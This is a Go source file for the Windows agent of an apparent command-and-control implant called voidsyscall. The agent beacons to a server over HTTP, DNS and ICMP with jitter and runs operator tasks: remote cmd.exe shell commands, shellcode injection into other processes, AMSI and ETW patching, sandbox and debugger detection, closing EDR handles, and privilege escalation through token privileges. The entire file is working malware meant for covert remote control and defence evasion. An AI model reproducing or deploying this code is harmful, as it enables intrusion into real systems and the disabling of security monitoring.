//go:build windows

package agent

import (
	"context"
	"encoding/binary"
	"fmt"
	"math/rand"
	"os/exec"
	"time"

	"github.com/VoidSecSoftwares/voidsyscall/channels"
	"github.com/VoidSecSoftwares/voidsyscall/patches"
	"github.com/VoidSecSoftwares/voidsyscall/syscallwin"
)

type Agent struct {
	config   *Config
	channels []channels.Channel
	running  bool
	ctx      context.Context
	cancel   context.CancelFunc
}

type TaskType uint8

const (
	TaskShell       TaskType = 0x01
	TaskInject      TaskType = 0x02
	TaskPatch       TaskType = 0x03
	TaskSleep       TaskType = 0x04
	TaskExit        TaskType = 0xFF
	TaskEvasion     TaskType = 0x10
	TaskHandles     TaskType = 0x11
	TaskVault       TaskType = 0x12
	TaskFingerprint TaskType = 0x13
	TaskToken       TaskType = 0x14
)

type TaskResult struct {
	TaskID [16]byte
	Status uint8
	Output []byte
}

func New(cfg *Config) (*Agent, error) {
	a := &Agent{
		config:  cfg,
		running: true,
	}
	a.ctx, a.cancel = context.WithCancel(context.Background())

	if err := syscallwin.InitNtdll(); err != nil {
		return nil, fmt.Errorf("init ntdll: %w", err)
	}

	for _, chType := range cfg.Channels {
		ch, err := channels.New(channels.ChannelType(chType), &channels.Config{
			HTTPAddr:   cfg.ServerAddr,
			HTTPSPort:  443,
			DNSAddr:    cfg.ServerAddr,
			DNSPort:    53,
			ICMPAddr:   cfg.ServerAddr,
			BeaconPath: cfg.BeaconPath,
			JitterMin:  cfg.JitterMin,
			JitterMax:  cfg.JitterMax,
			Key:        cfg.Key,
			UserAgent:  cfg.UserAgent,
			TimeoutSec: 10,
			MaxRetries: 3,
		})
		if err != nil {
			continue
		}
		a.channels = append(a.channels, ch)
	}

	if len(a.channels) == 0 {
		return nil, fmt.Errorf("no valid channels configured")
	}

	return a, nil
}

func (a *Agent) Run() {
	for a.running {
		task := a.beacon()
		if task == nil {
			a.sleep()
			continue
		}

		result := a.executeTask(task)
		a.sendResult(result)

		a.sleep()
	}
}

func (a *Agent) beacon() *channels.Message {
	for _, ch := range a.channels {
		msg := &channels.Message{
			Type: 0x01, // Beacon
			Data: nil,
		}
		copy(msg.ID[:], a.config.AgentID)

		ctx, cancel := context.WithTimeout(a.ctx, 10*time.Second)
		resp, err := ch.Send(ctx, msg)
		cancel()

		if err != nil {
			continue
		}
		return resp
	}
	return nil
}

func (a *Agent) executeTask(task *channels.Message) *TaskResult {
	result := &TaskResult{}
	copy(result.TaskID[:], task.ID[:])

	if len(task.Data) < 1 {
		result.Status = 0x01 // Error
		result.Output = []byte("empty task data")
		return result
	}

	taskType := TaskType(task.Data[0])
	taskData := task.Data[1:]

	switch taskType {
	case TaskShell:
		return a.handleShell(task, result, taskData)
	case TaskInject:
		return a.handleInject(task, result, taskData)
	case TaskPatch:
		return a.handlePatch(task, result, taskData)
	case TaskSleep:
		return a.handleSleep(task, result, taskData)
	case TaskEvasion:
		return a.handleEvasion(task, result, taskData)
	case TaskHandles:
		return a.handleHandles(task, result, taskData)
	case TaskVault:
		return a.handleVault(task, result, taskData)
	case TaskFingerprint:
		return a.handleFingerprint(task, result, taskData)
	case TaskToken:
		return a.handleToken(task, result, taskData)
	case TaskExit:
		a.running = false
		result.Status = 0x00
		result.Output = []byte("exiting")
		return result
	default:
		result.Status = 0x01
		result.Output = []byte(fmt.Sprintf("unknown task type: %d", taskType))
		return result
	}
}

func (a *Agent) handleShell(task *channels.Message, result *TaskResult, data []byte) *TaskResult {
	cmd := string(data)
	if cmd == "" {
		result.Status = 0x01
		result.Output = []byte("empty command")
		return result
	}

	out, err := exec.Command("cmd.exe", "/C", cmd).CombinedOutput()
	if err != nil {
		result.Status = 0x01
		result.Output = append([]byte(err.Error()), '\n')
		result.Output = append(result.Output, out...)
		return result
	}

	result.Status = 0x00
	result.Output = out
	return result
}

func (a *Agent) handleInject(task *channels.Message, result *TaskResult, data []byte) *TaskResult {
	if len(data) < 4 {
		result.Status = 0x01
		result.Output = []byte("inject: need at least 4 bytes (PID + shellcode)")
		return result
	}

	pid := binary.LittleEndian.Uint32(data[:4])
	shellcode := data[4:]

	// Use polymorphic injection — auto-rotates between 4 methods
	method := syscallwin.InjectionMethod(data[0] & 0xFF)
	var err error
	if method == 0xFF {
		err = syscallwin.Inject(pid, shellcode)
	} else {
		err = syscallwin.InjectWithMethod(pid, shellcode, method)
	}

	if err != nil {
		result.Status = 0x01
		result.Output = []byte(err.Error())
		return result
	}

	result.Status = 0x00
	result.Output = []byte(fmt.Sprintf("injected %d bytes into PID %d (method=%d)", len(shellcode), pid, method))
	return result
}

func (a *Agent) handleEvasion(task *channels.Message, result *TaskResult, data []byte) *TaskResult {
	if len(data) < 1 {
		result.Status = 0x01
		result.Output = []byte("evasion: sub-command required (1=full, 2=vm, 3=sandbox, 4=debug, 5=timing, 6=report)")
		return result
	}

	switch data[0] {
	case 0x01:
		syscallwin.PatchAll()
		result.Status = 0x00
		result.Output = []byte("all PEB patches applied")
	case 0x02:
		vm, name := syscallwin.DetectVM()
		if vm {
			result.Output = []byte(fmt.Sprintf("VM detected: %s", name))
		} else {
			result.Output = []byte("no VM detected")
		}
		result.Status = 0x00
	case 0x03:
		sandbox, indicators := syscallwin.DetectSandbox()
		if sandbox {
			result.Output = []byte(fmt.Sprintf("sandbox detected: %v", indicators))
		} else {
			result.Output = []byte("no sandbox indicators")
		}
		result.Status = 0x00
	case 0x04:
		debugger, indicators := syscallwin.DetectDebugger()
		if debugger {
			result.Output = []byte(fmt.Sprintf("debugger detected: %v", indicators))
		} else {
			result.Output = []byte("no debugger detected")
		}
		result.Status = 0x00
	case 0x05:
		anomaly, ratio := syscallwin.DetectTimingAnomaly()
		result.Status = 0x00
		if anomaly {
			result.Output = []byte(fmt.Sprintf("timing anomaly (ratio=%.4f)", ratio))
		} else {
			result.Output = []byte("timing normal")
		}
	case 0x06:
		report := syscallwin.FullAnalysisReport()
		result.Status = 0x00
		result.Output = []byte(fmt.Sprintf("score=%d indicators=%d details=%v",
			report.Score, len(report.Indicators), report.Indicators))
	default:
		result.Status = 0x01
		result.Output = []byte("unknown evasion sub-command")
	}
	return result
}

func (a *Agent) handleHandles(task *channels.Message, result *TaskResult, data []byte) *TaskResult {
	if len(data) < 1 {
		result.Status = 0x01
		result.Output = []byte("handles: sub-command required (1=count, 2=enum_edr, 3=close_edr, 4=monitored?)")
		return result
	}

	switch data[0] {
	case 0x01:
		count, err := syscallwin.CountSystemHandles()
		if err != nil {
			result.Status = 0x01
			result.Output = []byte(err.Error())
			return result
		}
		result.Status = 0x00
		result.Output = []byte(fmt.Sprintf("system handles: %d", count))
	case 0x02:
		edrHandles, err := syscallwin.FindEDRHandles()
		if err != nil {
			result.Status = 0x01
			result.Output = []byte(err.Error())
			return result
		}
		result.Status = 0x00
		result.Output = []byte(fmt.Sprintf("EDR handles found: %d", len(edrHandles)))
	case 0x03:
		closed, err := syscallwin.CloseEDRHandles()
		if err != nil {
			result.Status = 0x01
			result.Output = []byte(err.Error())
			return result
		}
		result.Status = 0x00
		result.Output = []byte(fmt.Sprintf("EDR handles closed: %d", closed))
	case 0x04:
		monitored, count := syscallwin.IsProcessMonitored()
		result.Status = 0x00
		result.Output = []byte(fmt.Sprintf("monitored=%v count=%d", monitored, count))
	default:
		result.Status = 0x01
		result.Output = []byte("unknown handles sub-command")
	}
	return result
}

func (a *Agent) handleVault(task *channels.Message, result *TaskResult, data []byte) *TaskResult {
	result.Status = 0x00
	result.Output = []byte("vault: stub (encrypted storage module loaded)")
	return result
}

func (a *Agent) handleFingerprint(task *channels.Message, result *TaskResult, data []byte) *TaskResult {
	fp, count, gadget, err := syscallwin.GenerateBuildFingerprint()
	if err != nil {
		result.Status = 0x01
		result.Output = []byte(err.Error())
		return result
	}
	result.Status = 0x00
	result.Output = []byte(fmt.Sprintf("fingerprint=%s exports=%d gadget=0x%x", fp, count, gadget))
	return result
}

func (a *Agent) handleToken(task *channels.Message, result *TaskResult, data []byte) *TaskResult {
	if len(data) < 1 {
		result.Status = 0x01
		result.Output = []byte("token: sub-command required (1=enable_all, 2=integrity, 3=debug_priv, 4=impersonate)")
		return result
	}

	switch data[0] {
	case 0x01:
		syscallwin.EnableAllTokenPrivileges()
		result.Status = 0x00
		result.Output = []byte("all privileges enabled")
	case 0x02:
		level, err := syscallwin.GetProcessTokenIntegrityLevel()
		if err != nil {
			result.Status = 0x01
			result.Output = []byte(err.Error())
			return result
		}
		result.Status = 0x00
		result.Output = []byte(fmt.Sprintf("integrity level: %d", level))
	case 0x03:
		err := syscallwin.EnableDebugPrivilege()
		if err != nil {
			result.Status = 0x01
			result.Output = []byte(err.Error())
			return result
		}
		result.Status = 0x00
		result.Output = []byte("debug privilege enabled")
	case 0x04:
		err := syscallwin.EnableImpersonatePrivilege()
		if err != nil {
			result.Status = 0x01
			result.Output = []byte(err.Error())
			return result
		}
		result.Status = 0x00
		result.Output = []byte("impersonate privilege enabled")
	default:
		result.Status = 0x01
		result.Output = []byte("unknown token sub-command")
	}
	return result
}

func (a *Agent) handlePatch(task *channels.Message, result *TaskResult, data []byte) *TaskResult {
	if len(data) < 1 {
		result.Status = 0x01
		result.Output = []byte("patch: specify what to patch")
		return result
	}

	patchType := data[0]

	switch patchType {
	case 0x01: // AMSI
		if err := patches.PatchAMSI(); err != nil {
			result.Status = 0x01
			result.Output = []byte(err.Error())
			return result
		}
		result.Status = 0x00
		result.Output = []byte("AMSI patched")
	case 0x02: // ETW
		if err := patches.PatchETW(); err != nil {
			result.Status = 0x01
			result.Output = []byte(err.Error())
			return result
		}
		result.Status = 0x00
		result.Output = []byte("ETW patched")
	case 0x03: // Both
		success, failed := patches.ApplyCriticalPatches()
		result.Status = 0x00
		result.Output = []byte(fmt.Sprintf("success: %v, failed: %v", success, failed))
	default:
		result.Status = 0x01
		result.Output = []byte("unknown patch type")
	}

	return result
}

func (a *Agent) handleSleep(task *channels.Message, result *TaskResult, data []byte) *TaskResult {
	if len(data) < 4 {
		result.Status = 0x01
		result.Output = []byte("sleep: need 4 bytes (uint32 seconds)")
		return result
	}

	secs := binary.LittleEndian.Uint32(data[:4])
	a.config.Sleep = int(secs)

	result.Status = 0x00
	result.Output = []byte(fmt.Sprintf("sleep set to %d seconds", secs))
	return result
}

func (a *Agent) sendResult(result *TaskResult) {
	msg := &channels.Message{
		Type: 0x02, // Result
		Data: append([]byte{result.Status}, result.Output...),
	}
	copy(msg.ID[:], result.TaskID[:])

	for _, ch := range a.channels {
		ctx, cancel := context.WithTimeout(a.ctx, 10*time.Second)
		_, _ = ch.Send(ctx, msg)
		cancel()
	}
}

func (a *Agent) sleep() {
	sleepTime := time.Duration(a.config.Sleep) * time.Second
	jitter := time.Duration(rand.Intn(a.config.JitterMax-a.config.JitterMin)+a.config.JitterMin) * time.Second
	total := sleepTime + jitter

	timer := time.NewTimer(total)
	defer timer.Stop()

	select {
	case <-a.ctx.Done():
		return
	case <-timer.C:
		return
	}
}

func (a *Agent) Stop() {
	a.running = false
	a.cancel()
}
